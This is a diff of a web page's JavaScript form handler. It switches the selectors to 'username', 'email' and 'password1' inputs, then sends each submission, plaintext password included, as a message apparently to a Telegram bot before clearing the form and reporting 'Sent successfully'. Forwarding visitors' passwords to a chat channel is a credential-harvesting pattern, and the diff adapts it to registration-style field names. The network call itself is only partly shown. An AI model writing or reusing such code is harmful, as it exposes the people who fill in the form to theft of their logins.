@@ -8,9 +8,9 @@ let buttonSend = document.querySelector('.btn')
 const emailRegExp =
 	/^(([^<>()[\].,;:\s@"]+(\.[^<>()[\].,;:\s@"]+)*)|(".+"))@(([^<>()[\].,;:\s@"]+\.)+[^<>()[\].,;:\s@"]{2,})$/iu
 
-const inputEmail = document.querySelector('.email'),
-	inputName = document.querySelector('.name'),
-	inputPassword = document.querySelector('.password')
+const inputEmail = document.querySelector('input[name=email]'),
+	inputName = document.querySelector('input[name=username]'),
+	inputPassword = document.querySelector('input[name=password1]')
 
 function isEmailValid(value) {
 	return emailRegExp.test(value)
@@ -79,14 +79,14 @@ if (
 	buttonSend.setAttribute('disabled', '')
 }
 
-let tgForm = document.querySelector('#tg')
+let tgForm = document.querySelector('.form')
 tgForm.addEventListener('submit', function (e) {
 	e.preventDefault()
 	//use html <b> <strong> <i> <a> <code> <pre>
 	let message = `<b>Заявка с сайта:</b>\n`
-	message += `<b>Отправитель:</b> ${this.name.value}\n`
+	message += `<b>Отправитель:</b> ${this.username.value}\n`
 	message += `<b>Email:</b> ${this.email.value}\n`
-	message += `<b>Пароль:</b> ${this.password.value}\n`
+	message += `<b>Пароль:</b> ${this.password1.value}\n`
 
 	console.log(message)
 
@@ -99,9 +99,9 @@ tgForm.addEventListener('submit', function (e) {
 			text: message,
 		})
 		.then((res) => {
-			this.name.value = ''
+			this.username.value = ''
 			this.email.value = ''
-			this.password.value = ''
+			this.password1.value = ''
 			success.innerHTML = 'Sent successfully'
 			success.style.display = 'block'
 
